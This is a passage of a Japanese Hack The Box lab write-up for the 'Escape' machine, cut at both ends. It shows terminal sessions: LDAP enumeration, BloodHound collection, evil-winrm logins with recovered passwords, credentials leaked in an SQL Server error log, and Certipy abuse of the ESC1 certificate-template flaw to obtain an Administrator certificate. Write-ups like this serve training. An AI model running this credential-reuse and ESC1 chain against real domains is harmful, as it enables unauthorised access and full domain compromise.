└─$ ldapsearch -H ldap://10.129.228.253 -ZZ -x -D "sql_svc@sequel.htb" -w 'REGGIE1234ronnie' -o "TLS_REQCERT=never" -b "DC=SEQUEL,DC=HTB" "(sAMAccountName=sql_svc)"
# extended LDIF
#
# LDAPv3
# base <DC=SEQUEL,DC=HTB> with scope subtree
# filter: (sAMAccountName=sql_svc)
# requesting: ALL
#

# sql_svc, Users, sequel.htb
dn: CN=sql_svc,CN=Users,DC=sequel,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: sql_svc
userCertificate:: MIIF3DCCBMSgAwIBAgITHgAAAAUu9wscGMZR0QAAAAAABTANBgkqhkiG9w0B
 AQsFADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVsMRUwEwYDV
 QQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE5MTE0MzE1WhcNMjQxMTE5MTE1MzE1WjASMRAwDgYDVQ
 QDDAdTcWxfc3ZjMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4eLDKDFYxUnDdnR2Bb1
 YcM4DgFQOT46d5/+Q49raE9l5Efvrk638GGw56PQjyDCQFNqgJmlD5IpCuz267a/z8qW3TDqft07w
 hWinuWqjamFGVLkQ+xTS00Nlx5GIa/aHV2O/58UpjEC6ibtiDruwy+Yb1mGNP1mM9YxUny7Q+zF+Y
 5cgzZ8h+RAxKLAlhIVpnKQE+lxXXFM2rTedHwR5Ic5ZNq75acxq9rcvi1miLue5M5HnbBJ4N6DKoF
 O65lzeqq+ttgBYVeehjCvd3rZlHSUj7DXvOKal+k3OK3kyQiTuj/fRmDAihtx20X/bDOp+OYWbizB
 h8vGbukocRUfwUQIDAQABo4IC9zCCAvMwMwYDVR0RBCwwKqAoBgorBgEEAYI3FAIDoBoMGGFkbWlu
 aXN0cmF0b3JAc2VxdWVsLmh0YjAdBgNVHQ4EFgQUKIL43+0l1Oh/naNaPlFgzf+qSqAwHwYDVR0jB
 BgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1UdHwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly
 8vQ049c2VxdWVsLURDLUNBLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyx
 DTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVS
 ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG9BggrB
 gEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1BSU
 EsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbix
 EQz1zZXF1ZWwsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0
 aW9uQXV0aG9yaXR5MA4GA1UdDwEB/wQEAwIFoDA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq
 /N2hdymVof9lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBAzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKw
 YBBQUHAwQGCisGAQQBgjcKAwQwNQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQc
 DBDAMBgorBgEEAYI3CgMEMEQGCSqGSIb3DQEJDwQ3MDUwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
 DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG9w0DBzANBgkqhkiG9w0BAQsFAAOCAQEAZ01AiWzYl6YAJ
 w2SS1rCN4LJGQz/nzOYBx2UF59jkqeJFZllLi93UTC8yE4QeNAeSLvFd2ois9xX7I+QGcPmfDviEn
 QcfQWPO7HqxNJP9PnwzLsc9MOoR5xlFBL5OkY7T4vLzBMkWnTTSCYnRTAR3MqfTfOGwnTr7ECkJsD
 YxgZYs1VzAAskHAVC6LsOZh/YxIkLp7l0+oLpnngcOqNZHwmMaGmiG9ep9X+GeSlLJdOxRrUWu4dc
 B8fkdQSUl5dr2B3dWRkRjnkm3CKgQzkqYlhH82kaVr3rL+ykXW0pGVV6PV8RBN8N/9hMaVvW6e+1Q
 Nu+NevwL2zOi7qA6Nn+hQ==
userCertificate:: MIIF3DCCBMSgAwIBAgITHgAAAAIIJKqyuve38QAAAAAAAjANBgkqhkiG9w0B
 AQsFADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVsMRUwEwYDV
 QQDEwxzZXF1ZWwtREMtQ0EwHhcNMjIxMTE4MjEwMzIzWhcNMjQxMTE4MjExMzIzWjASMRAwDgYDVQ
 QDDAdTcWxfc3ZjMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqncMksyHb52fqkWQ14k
 DmAK6uAseK0BfuFb/sS9N87o73JOO1W4qS+S+A5yfv3mPYLITA2igQgAG96ZmuftGG65gDlXAZPpk
 m95P2pf9sk92Cj71MhghuD7KO3fm5Lr89XFS5j3uYv1hs6HvhOiB8+Y8NKnNBbtrHLqOptNDCUqZ3
 ykH0JKixXTjkpld7wXR3l2DpZYZvNqEI2KIXKdk7jW+QkhVmf2bBvljiVz76woK5YYBxVaYNpGAAm
 shGCfhGFLqI3agX9n/+YJyei62tL7xRnTbOcA7NilD66A8ojctDWF43W94h+u5YDlsH7ammn+lJik
 qBuxwChJ0nmsSOwIDAQABo4IC9zCCAvMwMwYDVR0RBCwwKqAoBgorBgEEAYI3FAIDoBoMGGFkbWlu
 aXN0cmF0b3JAc2VxdWVsLmh0YjAdBgNVHQ4EFgQUhr2iMdkRAr5UPGQHF7ZDSVNgcpAwHwYDVR0jB
 BgwFoAUYp8yo6DwOCDUYMDNbcX6UTBewxUwgcQGA1UdHwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly
 8vQ049c2VxdWVsLURDLUNBLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyx
 DTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNlcXVlbCxEQz1odGI/Y2VydGlmaWNhdGVS
 ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG9BggrB
 gEFBQcBAQSBsDCBrTCBqgYIKwYBBQUHMAKGgZ1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1BSU
 EsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbix
 EQz1zZXF1ZWwsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0
 aW9uQXV0aG9yaXR5MA4GA1UdDwEB/wQEAwIFoDA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq
 /N2hdymVof9lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBAzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKw
 YBBQUHAwQGCisGAQQBgjcKAwQwNQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQc
 DBDAMBgorBgEEAYI3CgMEMEQGCSqGSIb3DQEJDwQ3MDUwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
 DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG9w0DBzANBgkqhkiG9w0BAQsFAAOCAQEAKe/ImgZBgNi9M
 Ohwm8bCoMFm8mIMwG1UVsOr/K+8Ov7//mtIVsvd7gO2Gx376trHKp/uYAqH9GijNyqvHPDvrgsYFO
 IK5TNHry/rh4NeXyE539f+yp5tXw766gj6ugcB/NnEmbNf5MhzZ5LSUPSxAITfhSw7ynrImm04QB/
 shNamnyDexEtQSZ0WmSH31gdPV41FO6KkuiL2CfsbQTz0UwWCtmMaNAs3tTMPXgEueN7s4EuJ2DaB
 R+SWea8ECcqciYLQN08OXQlxrA4vHdlFFhYDhwOEoK+HFcJuSwyEvVE30/DNFjbHeItL2JVjhS1kC
 YD65H/F7ecLNWv9oX6JvQ==
distinguishedName: CN=sql_svc,CN=Users,DC=sequel,DC=htb
instanceType: 4
whenCreated: 20221118211313.0Z
whenChanged: 20250808123008.0Z
uSNCreated: 16543
memberOf: CN=Remote Management Users,CN=Builtin,DC=sequel,DC=htb
uSNChanged: 176183
name: sql_svc
objectGUID:: FAmBI1aEl0WgwbF5qweQDQ==
userAccountControl: 66048
badPwdCount: 34
codePage: 0
countryCode: 0
badPasswordTime: 133991324980655791
lastLogoff: 0
lastLogon: 133991298088821374
pwdLastSet: 133132795931023287
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAnSwX8yHn8FjpghKZUgQAAA==
accountExpires: 9223372036854775807
logonCount: 34
sAMAccountName: sql_svc
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sequel,DC=htb
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133991298088821374

# search reference
ref: ldap://ForestDnsZones.sequel.htb/DC=ForestDnsZones,DC=sequel,DC=htb

# search reference
ref: ldap://DomainDnsZones.sequel.htb/DC=DomainDnsZones,DC=sequel,DC=htb

# search reference
ref: ldap://sequel.htb/CN=Configuration,DC=sequel,DC=htb

# search result
search: 3
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3

```
ldapでも認証通ることがわかった

## BloodHound
-  sql_svcの認証情報を使う
```sh
└─$ sudo bloodhound-python -u 'sql_svc' -p 'REGGIE1234ronnie' -ns 10.129.228.253 -d sequel.htb -c all
[sudo] password for kali: 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.sequel.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.sequel.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.sequel.htb
INFO: Done in 00M 23S

```


SQL_svcの様子
- DCに対して、CanPsRemoteできる
- WinRMで接続する
![](https://i.imgur.com/pXhgvbu.png)

接続できた
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ evil-winrm -i 10.129.228.253 -u sql_svc -p REGGIE1234ronnie   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

# Lateral Movement

SQLServerのログを見る
```sh
*Evil-WinRM* PS C:\SQLServer\Logs> ls


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK
2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)

2022-11-18 13:43:05.97 Server      UTC adjustment: -8:00
2022-11-18 13:43:05.97 Server      (c) Microsoft Corporation.
2022-11-18 13:43:05.97 Server      All rights reserved.
2022-11-18 13:43:05.97 Server      Server process ID is 3788.
2022-11-18 13:43:05.97 Server      System Manufacturer: 'VMware, Inc.', System Model: 'VMware7,1'.
2022-11-18 13:43:05.97 Server      Authentication mode is MIXED.
2022-11-18 13:43:05.97 Server      Logging SQL Server messages in file 'C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\Log\ERRORLOG'.
2022-11-18 13:43:05.97 Server      The service account is 'NT Service\MSSQL$SQLMOCK'. This is an informational message; no user action is required.
2022-11-18 13:43:05.97 Server      Registry startup parameters:
         -d C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
         -e C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\Log\ERRORLOG
         -l C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
2022-11-18 13:43:05.97 Server      Command Line Startup Parameters:
         -s "SQLMOCK"
         -m "SqlSetup"
         -Q
         -q "SQL_Latin1_General_CP1_CI_AS"
         -T 4022
         -T 4010
         -T 3659
         -T 3610
         -T 8015
2022-11-18 13:43:05.97 Server      SQL Server detected 1 sockets with 1 cores per socket and 1 logical processors per socket, 1 total logical processors; using 1 logical processors based on SQL Server licensing. This is an informational message; no user action is required.
2022-11-18 13:43:05.97 Server      SQL Server is starting at normal priority base (=7). This is an informational message only. No user action is required.
2022-11-18 13:43:05.97 Server      Detected 2046 MB of RAM. This is an informational message; no user action is required.
2022-11-18 13:43:05.97 Server      Using conventional memory in the memory manager.
2022-11-18 13:43:05.97 Server      Page exclusion bitmap is enabled.
2022-11-18 13:43:05.98 Server      Buffer Pool: Allocating 262144 bytes for 166158 hashPages.
2022-11-18 13:43:06.01 Server      Default collation: SQL_Latin1_General_CP1_CI_AS (us_english 1033)
2022-11-18 13:43:06.04 Server      Buffer pool extension is already disabled. No action is necessary.
2022-11-18 13:43:06.06 Server      Perfmon counters for resource governor pools and groups failed to initialize and are disabled.
2022-11-18 13:43:06.07 Server      Query Store settings initialized with enabled = 1,
2022-11-18 13:43:06.07 Server      This instance of SQL Server last reported using a process ID of 5116 at 11/18/2022 1:43:04 PM (local) 11/18/2022 9:43:04 PM (UTC). This is an informational message only; no user action is required.
2022-11-18 13:43:06.07 Server      Node configuration: node 0: CPU mask: 0x0000000000000001:0 Active CPU mask: 0x0000000000000001:0. This message provides a description of the NUMA configuration for this computer. This is an informational message only. No user action is required.
2022-11-18 13:43:06.07 Server      Using dynamic lock allocation.  Initial allocation of 2500 Lock blocks and 5000 Lock Owner blocks per node.  This is an informational message only.  No user action is required.
2022-11-18 13:43:06.08 Server      In-Memory OLTP initialized on lowend machine.
2022-11-18 13:43:06.08 Server      The maximum number of dedicated administrator connections for this instance is '1'
2022-11-18 13:43:06.09 Server      [INFO] Created Extended Events session 'hkenginexesession'

2022-11-18 13:43:06.09 Server      Database Instant File Initialization: disabled. For security and performance considerations see the topic 'Database Instant File Initialization' in SQL Server Books Online. This is an informational message only. No user action is required.
2022-11-18 13:43:06.10 Server      CLR version v4.0.30319 loaded.
2022-11-18 13:43:06.10 Server      Total Log Writer threads: 1. This is an informational message; no user action is required.
2022-11-18 13:43:06.13 Server      Database Mirroring Transport is disabled in the endpoint configuration.
2022-11-18 13:43:06.13 Server      clflushopt is selected for pmem flush operation.
2022-11-18 13:43:06.14 Server      Software Usage Metrics is disabled.
2022-11-18 13:43:06.14 spid9s      Warning ******************
2022-11-18 13:43:06.36 spid9s      SQL Server started in single-user mode. This an informational message only. No user action is required.
2022-11-18 13:43:06.36 Server      Common language runtime (CLR) functionality initialized using CLR version v4.0.30319 from C:\Windows\Microsoft.NET\Framework64\v4.0.30319\.
2022-11-18 13:43:06.37 spid9s      Starting up database 'master'.
2022-11-18 13:43:06.38 spid9s      The tail of the log for database master is being rewritten to match the new sector size of 4096 bytes.  2048 bytes at offset 419840 in file C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf will be written.
2022-11-18 13:43:06.39 spid9s      Converting database 'master' from version 897 to the current version 904.
2022-11-18 13:43:06.39 spid9s      Database 'master' running the upgrade step from version 897 to version 898.
2022-11-18 13:43:06.40 spid9s      Database 'master' running the upgrade step from version 898 to version 899.
2022-11-18 13:43:06.41 spid9s      Database 'master' running the upgrade step from version 899 to version 900.
2022-11-18 13:43:06.41 spid9s      Database 'master' running the upgrade step from version 900 to version 901.
2022-11-18 13:43:06.41 spid9s      Database 'master' running the upgrade step from version 901 to version 902.
2022-11-18 13:43:06.52 spid9s      Database 'master' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:06.52 spid9s      Database 'master' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:06.72 spid9s      SQL Server Audit is starting the audits. This is an informational message. No user action is required.
2022-11-18 13:43:06.72 spid9s      SQL Server Audit has started the audits. This is an informational message. No user action is required.
2022-11-18 13:43:06.74 spid9s      SQL Trace ID 1 was started by login "sa".
2022-11-18 13:43:06.74 spid9s      Server name is 'DC\SQLMOCK'. This is an informational message only. No user action is required.
2022-11-18 13:43:06.75 spid14s     Starting up database 'mssqlsystemresource'.
2022-11-18 13:43:06.75 spid9s      Starting up database 'msdb'.
2022-11-18 13:43:06.75 spid18s     Password policy update was successful.
2022-11-18 13:43:06.76 spid14s     The resource database build version is 15.00.2000. This is an informational message only. No user action is required.
2022-11-18 13:43:06.78 spid9s      The tail of the log for database msdb is being rewritten to match the new sector size of 4096 bytes.  3072 bytes at offset 50176 in file C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBLog.ldf will be written.
2022-11-18 13:43:06.78 spid9s      Converting database 'msdb' from version 897 to the current version 904.
2022-11-18 13:43:06.78 spid9s      Database 'msdb' running the upgrade step from version 897 to version 898.
2022-11-18 13:43:06.79 spid14s     Starting up database 'model'.
2022-11-18 13:43:06.79 spid9s      Database 'msdb' running the upgrade step from version 898 to version 899.
2022-11-18 13:43:06.80 spid14s     The tail of the log for database model is being rewritten to match the new sector size of 4096 bytes.  512 bytes at offset 73216 in file C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\modellog.ldf will be written.
2022-11-18 13:43:06.80 spid9s      Database 'msdb' running the upgrade step from version 899 to version 900.
2022-11-18 13:43:06.81 spid14s     Converting database 'model' from version 897 to the current version 904.
2022-11-18 13:43:06.81 spid14s     Database 'model' running the upgrade step from version 897 to version 898.
2022-11-18 13:43:06.81 spid9s      Database 'msdb' running the upgrade step from version 900 to version 901.
2022-11-18 13:43:06.81 spid14s     Database 'model' running the upgrade step from version 898 to version 899.
2022-11-18 13:43:06.81 spid9s      Database 'msdb' running the upgrade step from version 901 to version 902.
2022-11-18 13:43:06.82 spid14s     Database 'model' running the upgrade step from version 899 to version 900.
2022-11-18 13:43:06.88 spid18s     A self-generated certificate was successfully loaded for encryption.
2022-11-18 13:43:06.88 spid18s     Server local connection provider is ready to accept connection on [ \\.\pipe\SQLLocal\SQLMOCK ].
2022-11-18 13:43:06.88 spid18s     Dedicated administrator connection support was not started because it is disabled on this edition of SQL Server. If you want to use a dedicated administrator connection, restart SQL Server using the trace flag 7806. This is an informational message only. No user action is required.
2022-11-18 13:43:06.88 spid18s     SQL Server is now ready for client connections. This is an informational message; no user action is required.
2022-11-18 13:43:06.88 Server      SQL Server is attempting to register a Service Principal Name (SPN) for the SQL Server service. Kerberos authentication will not be possible until a SPN is registered for the SQL Server service. This is an informational message. No user action is required.
2022-11-18 13:43:06.88 spid14s     Database 'model' running the upgrade step from version 900 to version 901.
2022-11-18 13:43:06.89 Server      The SQL Server Network Interface library could not register the Service Principal Name (SPN) [ MSSQLSvc/dc.sequel.htb:SQLMOCK ] for the SQL Server service. Windows return code: 0x2098, state: 15. Failure to register a SPN might cause integrated authentication to use NTLM instead of Kerberos. This is an informational message. Further action is only required if Kerberos authentication is required by authentication policies and if the SPN has not been manually registered.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 901 to version 902.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:07.00 spid14s     Clearing tempdb database.
2022-11-18 13:43:07.06 spid14s     Starting up database 'tempdb'.
2022-11-18 13:43:07.17 spid9s      Database 'msdb' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:07.17 spid9s      Database 'msdb' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:07.29 spid9s      Recovery is complete. This is an informational message only. No user action is required.
2022-11-18 13:43:07.30 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.30 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.33 spid51      Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'default language' changed from 0 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'default full-text language' changed from 1033 to 1033. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'user instances enabled' changed from 1 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.44 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a 'stop' request from Service Control Manager. This is an informational message only. No user action is required.
2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = '1'. This is an informational message only; no user action is required.
*Evil-WinRM* PS C:\SQLServer\Logs> 

```

実際のログに、ユーザーとパスワードが見つかる
```
Logon failed for user 'sequel.htb\Ryan.Cooper' …
Logon failed for user 'NuclearMosquito3' …
```

### Ryan.Cooperの認証情報
Ryan.Cooper : NuclearMosquito3

evil-winrmでログインする
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ evil-winrm -i 10.129.228.253 -u 'Ryan.Cooper' -p 'NuclearMosquito3' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 

```

user.txtの取得
```sh
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> ls
    Directory: C:\Users\Ryan.Cooper\Desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         8/8/2025   5:30 AM             34 user.txt
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
```

# Privilege Escalation
証明書の脆弱性を調べる
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ certipy-ad find -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' -target sequel.htb -stdout -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: sequel.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

ESC1が脆弱であることがわかった
- これを使って、権限昇格する

脆弱な証明書の取得
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ certipy-ad req -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' \
  -ca 'sequel-DC-CA' -target 'dc.sequel.htb' \
  -template 'UserAuthentication' -upn 'Administrator@sequel.htb' \
  -out admin
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'admin.pfx'
[*] Wrote certificate and private key to 'admin.pfx'
```

NTLMハッシュのリクエスト
- その前に時刻同期もした
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ sudo ntpdate -u 10.129.228.253
2025-08-08 08:40:53.541857 (-0700) +28800.491889 +/- 0.042498 10.129.228.253 s1 no-leap
CLOCK: time stepped by 28800.491889
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Escape]
└─$ certipy-ad auth -pfx admin.pfx -dc-ip 10.129.228.253
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@sequel.htb'
